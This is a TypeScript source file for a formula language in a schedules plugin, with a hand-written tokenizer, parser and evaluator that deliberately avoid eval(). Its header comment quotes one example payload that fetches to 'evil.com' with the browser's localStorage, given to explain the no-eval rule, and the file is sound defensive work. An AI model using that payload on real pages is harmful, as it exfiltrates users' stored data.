// Formula evaluator — pure DSL parser + evaluator (S41 / ADR-0032).
//
// SCOPE
// ─────────────────────────────────────────────────────────────────────────────
// Hand-rolled tokenizer + recursive-descent parser + tree-walking
// evaluator.  NO `eval()`, NO `Function`, NO regex-driven dispatch on
// untrusted input.  ADR-0032 §"Why no eval()" is the canonical
// rationale: a malicious `.pryzm` file containing
// `eval('fetch("evil.com",{body:JSON.stringify(localStorage)})')`
// MUST be evaluated as a literal string, not executed.
//
// SUPPORTED GRAMMAR (full)
// ─────────────────────────────────────────────────────────────────────────────
//
//   expr       := orExpr
//   orExpr     := andExpr ('||' andExpr)*
//   andExpr    := compExpr ('&&' compExpr)*
//   compExpr   := addExpr (('==' | '!=' | '<' | '<=' | '>' | '>=') addExpr)?
//   addExpr    := mulExpr (('+' | '-') mulExpr)*
//   mulExpr    := unaryExpr (('*' | '/' | '%') unaryExpr)*
//   unaryExpr  := ('!' | '-')? primary
//   primary    := number | string | bool | 'null'
//               | ident                              // field ref OR cross-column ref OR built-in COUNT
//               | ident '(' [expr (',' expr)*] ')'   // function call
//               | '(' expr ')'
//
//   number := /-?[0-9]+(\.[0-9]+)?/
//   string := /"([^"\\]|\\["\\nrt])*"/  (also single-quoted)
//   bool   := 'true' | 'false'
//   ident  := /[A-Za-z_][A-Za-z0-9_]*/
//
// SEMANTICS (full)
// ─────────────────────────────────────────────────────────────────────────────
// • Literals: number, string, boolean, null.
// • Identifier resolution order (case-sensitive):
//     1. The reserved literals `true`, `false`, `null`.
//     2. The bare built-in `COUNT` (with no parens) — alias for
//        `COUNT()`, returns the count of `allElements`.  This shortcut
//        is in the spec example `formula = 'COUNT'`.
//     3. A field on the current `element` (looked up via direct
//        property access — no dot paths in S41).
//     4. A column id on the SAME schedule (cross-column reference) —
//        evaluated transitively with cycle detection (depth + visiting set).
//     5. Otherwise: throw `FormulaUndefinedIdentifierError` ⇒ `'#UNDEF'`.
// • Built-in functions:
//     COUNT()                  → number      length of allElements (1 if grouped)
//     SUM(expr)                → number      sum of `expr` evaluated for each element in allElements
//     AVG(expr)                → number      mean of `expr` over allElements (NaN ⇒ 0 if empty set)
//     MIN(expr) / MAX(expr)    → number      min/max of `expr` over allElements
//     IF(cond, then, else)     → any         conditional
//     ROUND(expr, n)           → number      Math.round(x*10^n)/10^n
//     CONCAT(a, b, ...)        → string      String(a) + String(b) + …
//     LEN(expr)                → number      string length (or array length, or 0)
//     UPPER(expr) / LOWER(expr)→ string      String(expr).toUpperCase() / .toLowerCase()
//     COALESCE(a, b, ...)      → any         first non-null/undefined argument
// • Arithmetic: numeric coercion (`Number(x)`).  Division by zero → null.
//   Modulo: `%`.
// • Comparison: == / != use SameValue (Object.is) but with numeric
//   string-to-number coercion when both sides are numeric strings (so
//   `"3" == 3` is true).  The four ordering operators always coerce
//   both sides to Number.
// • Logical && / || are short-circuiting on JS truthiness.  Unary `!`
//   coerces to boolean.  Unary `-` coerces to number.
// • All evaluation errors are caught at the per-cell level by
//   `evaluate-schedule.ts` (which wraps each per-column evaluation in
//   try/catch).  This file throws on error; the catch site decides the
//   sentinel (`'#ERR'`, `'#UNDEF'`, `'#CIRCULAR'`).
//
// CIRCULAR DETECTION
// ─────────────────────────────────────────────────────────────────────────────
// Two layers per ADR-0032:
//   1. Per-eval depth counter (`FORMULA_MAX_DEPTH = 100`).  Any deeper
//      ⇒ throw `FormulaCircularError`.
//   2. `visiting: Set<columnId>` for cross-column references.  Re-entry
//      to a column already in `visiting` ⇒ throw
//      `FormulaCircularError`.  The set is per-row evaluation (a
//      column can legitimately appear in two unrelated row evaluations).

import {
  FORMULA_MAX_DEPTH,
  isBuiltinFunction,
  type BinaryOp,
  type FormulaNode,
  type FormulaResult,
  type UnaryOp,
} from '@pryzm/plugin-sdk';
import {
  FormulaArityError,
  FormulaParseError,
  FormulaUndefinedIdentifierError,
  SchedulesPluginError,
} from './errors.js';

// ── Tokenizer ──────────────────────────────────────────────────────────────

type TokenKind =
  | 'NUMBER' | 'STRING' | 'BOOL' | 'NULL' | 'IDENT'
  | 'LPAREN' | 'RPAREN' | 'COMMA'
  | 'PLUS' | 'MINUS' | 'STAR' | 'SLASH' | 'PERCENT'
  | 'EQ' | 'NEQ' | 'LT' | 'LTE' | 'GT' | 'GTE'
  | 'AND' | 'OR' | 'BANG'
  | 'EOF';

interface Token {
  readonly kind: TokenKind;
  readonly value: string;
  readonly pos: number;
}

function isIdentStart(ch: string): boolean {
  return (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') || ch === '_';
}
function isIdentCont(ch: string): boolean {
  return isIdentStart(ch) || (ch >= '0' && ch <= '9');
}
function isDigit(ch: string): boolean {
  return ch >= '0' && ch <= '9';
}

function tokenize(src: string): readonly Token[] {
  const out: Token[] = [];
  const N = src.length;
  let i = 0;
  while (i < N) {
    const ch = src[i]!;
    if (ch === ' ' || ch === '\t' || ch === '\n' || ch === '\r') { i++; continue; }
    const start = i;

    // Punctuation + multi-char operators.
    if (ch === '(') { out.push({ kind: 'LPAREN', value: ch, pos: start }); i++; continue; }
    if (ch === ')') { out.push({ kind: 'RPAREN', value: ch, pos: start }); i++; continue; }
    if (ch === ',') { out.push({ kind: 'COMMA',  value: ch, pos: start }); i++; continue; }
    if (ch === '+') { out.push({ kind: 'PLUS',   value: ch, pos: start }); i++; continue; }
    if (ch === '-') { out.push({ kind: 'MINUS',  value: ch, pos: start }); i++; continue; }
    if (ch === '*') { out.push({ kind: 'STAR',   value: ch, pos: start }); i++; continue; }
    if (ch === '/') { out.push({ kind: 'SLASH',  value: ch, pos: start }); i++; continue; }
    if (ch === '%') { out.push({ kind: 'PERCENT',value: ch, pos: start }); i++; continue; }
    if (ch === '=' && src[i + 1] === '=') { out.push({ kind: 'EQ',  value: '==', pos: start }); i += 2; continue; }
    if (ch === '!' && src[i + 1] === '=') { out.push({ kind: 'NEQ', value: '!=', pos: start }); i += 2; continue; }
    if (ch === '<' && src[i + 1] === '=') { out.push({ kind: 'LTE', value: '<=', pos: start }); i += 2; continue; }
    if (ch === '>' && src[i + 1] === '=') { out.push({ kind: 'GTE', value: '>=', pos: start }); i += 2; continue; }
    if (ch === '<') { out.push({ kind: 'LT',  value: '<',  pos: start }); i++; continue; }
    if (ch === '>') { out.push({ kind: 'GT',  value: '>',  pos: start }); i++; continue; }
    if (ch === '&' && src[i + 1] === '&') { out.push({ kind: 'AND', value: '&&', pos: start }); i += 2; continue; }
    if (ch === '|' && src[i + 1] === '|') { out.push({ kind: 'OR',  value: '||', pos: start }); i += 2; continue; }
    if (ch === '!') { out.push({ kind: 'BANG', value: '!', pos: start }); i++; continue; }

    // String literals — double or single quoted, with \\ \" \n \r \t \' escapes.
    if (ch === '"' || ch === '\'') {
      const quote = ch;
      i++;
      let s = '';
      while (i < N && src[i] !== quote) {
        const c = src[i]!;
        if (c === '\\') {
          const next = src[i + 1];
          if (next === undefined) throw new FormulaParseError(src, i, 'unterminated escape');
          if (next === 'n') s += '\n';
          else if (next === 'r') s += '\r';
          else if (next === 't') s += '\t';
          else s += next;
          i += 2;
        } else {
          s += c;
          i++;
        }
      }
      if (i >= N) throw new FormulaParseError(src, start, 'unterminated string literal');
      i++; // skip closing quote
      out.push({ kind: 'STRING', value: s, pos: start });
      continue;
    }

    // Number literal — integer or fraction.  No exponent in S41 (add later if needed).
    if (isDigit(ch) || (ch === '.' && isDigit(src[i + 1] ?? ''))) {
      let j = i;
      while (j < N && isDigit(src[j]!)) j++;
      if (src[j] === '.') {
        j++;
        while (j < N && isDigit(src[j]!)) j++;
      }
      out.push({ kind: 'NUMBER', value: src.slice(i, j), pos: start });
      i = j;
      continue;
    }

    // Identifier or keyword.
    if (isIdentStart(ch)) {
      let j = i + 1;
      while (j < N && isIdentCont(src[j]!)) j++;
      const word = src.slice(i, j);
      if (word === 'true' || word === 'false') {
        out.push({ kind: 'BOOL', value: word, pos: start });
      } else if (word === 'null') {
        out.push({ kind: 'NULL', value: word, pos: start });
      } else {
        out.push({ kind: 'IDENT', value: word, pos: start });
      }
      i = j;
      continue;
    }

    throw new FormulaParseError(src, start, `unexpected character "${ch}"`);
  }
  out.push({ kind: 'EOF', value: '', pos: N });
  return out;
}

// ── Parser (recursive descent) ─────────────────────────────────────────────

class Parser {
  private pos = 0;
  constructor(private readonly tokens: readonly Token[], private readonly src: string) {}

  parse(): FormulaNode {
    const expr = this.parseExpr();
    if (this.peek().kind !== 'EOF') {
      const t = this.peek();
      throw new FormulaParseError(this.src, t.pos, `unexpected token "${t.value}" after expression`);
    }
    return expr;
  }

  private peek(): Token { return this.tokens[this.pos]!; }
  private advance(): Token { return this.tokens[this.pos++]!; }
  private match(...kinds: TokenKind[]): Token | null {
    if (kinds.includes(this.peek().kind)) return this.advance();
    return null;
  }
  private expect(kind: TokenKind, message: string): Token {
    const t = this.peek();
    if (t.kind !== kind) throw new FormulaParseError(this.src, t.pos, `${message} (got ${t.kind} "${t.value}")`);
    return this.advance();
  }

  // expr := orExpr
  private parseExpr(): FormulaNode { return this.parseOr(); }

  private parseOr(): FormulaNode {
    let left = this.parseAnd();
    while (this.match('OR')) {
      const right = this.parseAnd();
      left = { kind: 'binary', op: '||', left, right };
    }
    return left;
  }
  private parseAnd(): FormulaNode {
    let left = this.parseComp();
    while (this.match('AND')) {
      const right = this.parseComp();
      left = { kind: 'binary', op: '&&', left, right };
    }
    return left;
  }
  private parseComp(): FormulaNode {
    const left = this.parseAdd();
    const opTok = this.match('EQ', 'NEQ', 'LT', 'LTE', 'GT', 'GTE');
    if (!opTok) return left;
    const right = this.parseAdd();
    return { kind: 'binary', op: opTok.value as BinaryOp, left, right };
  }
  private parseAdd(): FormulaNode {
    let left = this.parseMul();
    while (true) {
      const t = this.match('PLUS', 'MINUS');
      if (!t) return left;
      const right = this.parseMul();
      left = { kind: 'binary', op: t.value === '+' ? '+' : '-', left, right };
    }
  }
  private parseMul(): FormulaNode {
    let left = this.parseUnary();
    while (true) {
      const t = this.match('STAR', 'SLASH', 'PERCENT');
      if (!t) return left;
      const right = this.parseUnary();
      const op = t.value === '*' ? '*' : t.value === '/' ? '/' : '%';
      left = { kind: 'binary', op, left, right };
    }
  }
  private parseUnary(): FormulaNode {
    const t = this.match('BANG', 'MINUS');
    if (t) {
      const operand = this.parseUnary();
      const op: UnaryOp = t.value === '!' ? '!' : '-';
      return { kind: 'unary', op, operand };
    }
    return this.parsePrimary();
  }
  private parsePrimary(): FormulaNode {
    const t = this.peek();
    switch (t.kind) {
      case 'NUMBER': {
        this.advance();
        return { kind: 'lit', value: Number(t.value) };
      }
      case 'STRING': {
        this.advance();
        return { kind: 'lit', value: t.value };
      }
      case 'BOOL': {
        this.advance();
        return { kind: 'lit', value: t.value === 'true' };
      }
      case 'NULL': {
        this.advance();
        return { kind: 'lit', value: null };
      }
      case 'LPAREN': {
        this.advance();
        const inner = this.parseExpr();
        this.expect('RPAREN', 'expected ")"');
        return inner;
      }
      case 'IDENT': {
        this.advance();
        const name = t.value;
        // Function call?
        if (this.peek().kind === 'LPAREN') {
          this.advance();
          const args: FormulaNode[] = [];
          if (this.peek().kind !== 'RPAREN') {
            args.push(this.parseExpr());
            while (this.match('COMMA')) args.push(this.parseExpr());
          }
          this.expect('RPAREN', 'expected ")" closing function call');
          return { kind: 'call', name, args };
        }
        return { kind: 'ident', name };
      }
      default:
        throw new FormulaParseError(this.src, t.pos, `unexpected token "${t.value}" (kind=${t.kind})`);
    }
  }
}

/** Parse a formula source string into an AST.  Throws
 *  `FormulaParseError` on malformed input. */
export function parseFormula(src: string): FormulaNode {
  const tokens = tokenize(src);
  return new Parser(tokens, src).parse();
}

// ── Evaluator ──────────────────────────────────────────────────────────────

/** A read-only element wrapped by the evaluator.  We accept any record
 *  type so the formula language can sit on top of any element family
 *  without a hard-coded element-DTO union. */
export type EvalElement = Readonly<Record<string, unknown>>;

/** Per-row evaluation context handed to the evaluator.  The evaluator
 *  may recursively evaluate other column formulas on the SAME schedule
 *  via the `columnsById` registry; cycles are detected via
 *  `visiting` + the depth counter. */
export interface EvalContext {
  /** The element this row was derived from. */
  readonly element: EvalElement;
  /** All elements in the schedule's source set (after filter, before
   *  grouping for ungrouped schedules; the GROUP for grouped schedules). */
  readonly allElements: readonly EvalElement[];
  /** Cross-column registry — keyed by column id, value = column AST.
   *  Optional; the formula can still reference fields without it. */
  readonly columnsById?: Readonly<Record<string, FormulaNode>>;
  /** Visiting set for circular-reference detection.  The evaluator
   *  initialises this on the public entry point; recursive calls
   *  forward and extend it. */
  readonly visiting?: ReadonlySet<string>;
  /** Recursion depth — incremented on every recursive call.  Capped at
   *  `FORMULA_MAX_DEPTH`. */
  readonly depth?: number;
}

export class FormulaCircularError extends SchedulesPluginError {
  constructor(public readonly columnId: string) {
    super(`[schedules] circular reference detected at column "${columnId}"`);
  }
}

/** Public entry point — parse + evaluate a formula string.  Convenience
 *  wrapper around `parseFormula` + `evaluateAst`.  Re-parses on every
 *  call; for hot-path use, parse once and cache the AST. */
export function evaluateFormula(src: string, ctx: EvalContext): FormulaResult {
  const ast = parseFormula(src);
  return evaluateAst(ast, ctx);
}

/** Walk a parsed AST against `ctx`. */
export function evaluateAst(node: FormulaNode, ctx: EvalContext): FormulaResult {
  const depth = (ctx.depth ?? 0) + 1;
  if (depth > FORMULA_MAX_DEPTH) {
    throw new FormulaCircularError('<depth-cap>');
  }
  const next: EvalContext = { ...ctx, depth };

  switch (node.kind) {
    case 'lit':
      return node.value;

    case 'ident': {
      // 1. Bare built-in COUNT (no parens).
      if (node.name === 'COUNT') return ctx.allElements.length;
      // 2. Field reference on the current element.
      if (Object.prototype.hasOwnProperty.call(ctx.element, node.name)) {
        return coerceValue(ctx.element[node.name]);
      }
      // 3. Cross-column reference.
      if (ctx.columnsById && Object.prototype.hasOwnProperty.call(ctx.columnsById, node.name)) {
        const visiting = new Set<string>(ctx.visiting ?? []);
        if (visiting.has(node.name)) {
          throw new FormulaCircularError(node.name);
        }
        visiting.add(node.name);
        return evaluateAst(ctx.columnsById[node.name]!, { ...next, visiting });
      }
      // 4. Undefined.
      throw new FormulaUndefinedIdentifierError(node.name);
    }

    case 'unary': {
      const v = evaluateAst(node.operand, next);
      if (node.op === '!') return !truthy(v);
      // '-' — numeric coercion.
      const n = toNumber(v);
      return n === null ? null : -n;
    }

    case 'binary':
      return evalBinary(node.op, node.left, node.right, next);

    case 'call':
      return evalCall(node.name, node.args, next);
  }
}

function evalBinary(
  op: BinaryOp,
  leftNode: FormulaNode,
  rightNode: FormulaNode,
  ctx: EvalContext,
): FormulaResult {
  // Short-circuit logical operators FIRST so `IF(0, x/0, 1)`-style
  // safe formulas don't trigger NaN cascades.
  if (op === '&&') {
    const l = evaluateAst(leftNode, ctx);
    if (!truthy(l)) return false;
    return truthy(evaluateAst(rightNode, ctx));
  }
  if (op === '||') {
    const l = evaluateAst(leftNode, ctx);
    if (truthy(l)) return true;
    return truthy(evaluateAst(rightNode, ctx));
  }

  const left = evaluateAst(leftNode, ctx);
  const right = evaluateAst(rightNode, ctx);

  switch (op) {
    case '+': {
      // Spec: arithmetic (number coercion).  String concatenation goes
      // through CONCAT() per ADR-0032 to keep the operator overload
      // table small.
      const ln = toNumber(left), rn = toNumber(right);
      if (ln === null || rn === null) return null;
      return ln + rn;
    }
    case '-': {
      const ln = toNumber(left), rn = toNumber(right);
      if (ln === null || rn === null) return null;
      return ln - rn;
    }
    case '*': {
      const ln = toNumber(left), rn = toNumber(right);
      if (ln === null || rn === null) return null;
      return ln * rn;
    }
    case '/': {
      const ln = toNumber(left), rn = toNumber(right);
      if (ln === null || rn === null || rn === 0) return null;
      return ln / rn;
    }
    case '%': {
      const ln = toNumber(left), rn = toNumber(right);
      if (ln === null || rn === null || rn === 0) return null;
      return ln % rn;
    }
    case '==': return looseEqual(left, right);
    case '!=': return !looseEqual(left, right);
    case '<':  { const a = toNumber(left), b = toNumber(right); return a !== null && b !== null && a < b;  }
    case '<=': { const a = toNumber(left), b = toNumber(right); return a !== null && b !== null && a <= b; }
    case '>':  { const a = toNumber(left), b = toNumber(right); return a !== null && b !== null && a > b;  }
    case '>=': { const a = toNumber(left), b = toNumber(right); return a !== null && b !== null && a >= b; }
  }
  throw new SchedulesPluginError(`[schedules] unknown binary operator "${op}"`);
}

function evalCall(name: string, args: readonly FormulaNode[], ctx: EvalContext): FormulaResult {
  if (!isBuiltinFunction(name)) {
    throw new FormulaUndefinedIdentifierError(name);
  }
  const arity = (n: number, expected: string): void => {
    if (args.length !== n) throw new FormulaArityError(name, expected, args.length);
  };
  const arityRange = (min: number, max: number, expected: string): void => {
    if (args.length < min || args.length > max) throw new FormulaArityError(name, expected, args.length);
  };

  switch (name) {
    case 'COUNT': {
      arityRange(0, 1, '0 or 1');
      // COUNT() = #allElements; COUNT(cond) = #elements satisfying cond.
      if (args.length === 0) return ctx.allElements.length;
      let n = 0;
      for (const el of ctx.allElements) {
        const sub = { ...ctx, element: el };
        if (truthy(evaluateAst(args[0]!, sub))) n++;
      }
      return n;
    }
    case 'SUM':
    case 'AVG':
    case 'MIN':
    case 'MAX': {
      arity(1, '1');
      const arg = args[0]!;
      let acc: number | null = name === 'SUM' || name === 'AVG' ? 0 : null;
      let count = 0;
      for (const el of ctx.allElements) {
        const sub = { ...ctx, element: el };
        const v = toNumber(evaluateAst(arg, sub));
        if (v === null) continue; // skip missing/non-numeric values
        count++;
        if (name === 'SUM' || name === 'AVG') acc = (acc as number) + v;
        else if (name === 'MIN') acc = acc === null ? v : Math.min(acc, v);
        else if (name === 'MAX') acc = acc === null ? v : Math.max(acc, v);
      }
      if (name === 'AVG') return count === 0 ? null : (acc as number) / count;
      return acc;
    }
    case 'IF': {
      arity(3, '3');
      const cond = evaluateAst(args[0]!, ctx);
      return evaluateAst(truthy(cond) ? args[1]! : args[2]!, ctx);
    }
    case 'ROUND': {
      arityRange(1, 2, '1 or 2');
      const v = toNumber(evaluateAst(args[0]!, ctx));
      if (v === null) return null;
      const n = args.length === 2 ? toNumber(evaluateAst(args[1]!, ctx)) ?? 0 : 0;
      const factor = Math.pow(10, Math.max(0, Math.floor(n)));
      return Math.round(v * factor) / factor;
    }
    case 'CONCAT': {
      let s = '';
      for (const a of args) s += stringify(evaluateAst(a, ctx));
      return s;
    }
    case 'LEN': {
      arity(1, '1');
      const v = evaluateAst(args[0]!, ctx);
      if (v === null || v === undefined) return 0;
      if (typeof v === 'string') return v.length;
      if (Array.isArray(v)) return (v as unknown[]).length;
      return String(v).length;
    }
    case 'UPPER': {
      arity(1, '1');
      return stringify(evaluateAst(args[0]!, ctx)).toUpperCase();
    }
    case 'LOWER': {
      arity(1, '1');
      return stringify(evaluateAst(args[0]!, ctx)).toLowerCase();
    }
    case 'COALESCE': {
      for (const a of args) {
        const v = evaluateAst(a, ctx);
        if (v !== null && v !== undefined) return v;
      }
      return null;
    }
  }
  throw new FormulaUndefinedIdentifierError(name);
}

// ── Coercion helpers ───────────────────────────────────────────────────────

function coerceValue(v: unknown): FormulaResult {
  if (v === null || v === undefined) return null;
  if (typeof v === 'string' || typeof v === 'number' || typeof v === 'boolean') return v;
  if (typeof v === 'object') {
    // We don't return objects/arrays from a cell — fall back to JSON
    // string so a malformed schema doesn't poison rendering.
    try { return JSON.stringify(v); } catch { return null; }
  }
  return null;
}

function toNumber(v: FormulaResult): number | null {
  if (v === null) return null;
  if (typeof v === 'number') return Number.isFinite(v) ? v : null;
  if (typeof v === 'boolean') return v ? 1 : 0;
  if (typeof v === 'string') {
    if (v === '') return null;
    const n = Number(v);
    return Number.isFinite(n) ? n : null;
  }
  return null;
}

function truthy(v: FormulaResult): boolean {
  if (v === null) return false;
  if (typeof v === 'boolean') return v;
  if (typeof v === 'number') return v !== 0 && !Number.isNaN(v);
  if (typeof v === 'string') return v.length > 0;
  return true;
}

function stringify(v: FormulaResult): string {
  if (v === null || v === undefined) return '';
  return String(v);
}

/** Loose equality with numeric-string coercion.  `"3" == 3 ⇒ true`,
 *  `"3.0" == 3 ⇒ true`, `null == undefined ⇒ true` (we don't model
 *  undefined separately — it's coerced to null on read). */
function looseEqual(a: FormulaResult, b: FormulaResult): boolean {
  if (a === b) return true;
  if (a === null || b === null) return false;
  if (typeof a === typeof b) return Object.is(a, b);
  // Mixed types — try numeric coercion.
  const na = toNumber(a), nb = toNumber(b);
  if (na !== null && nb !== null) return na === nb;
  // Fall back to string compare.
  return stringify(a) === stringify(b);
}
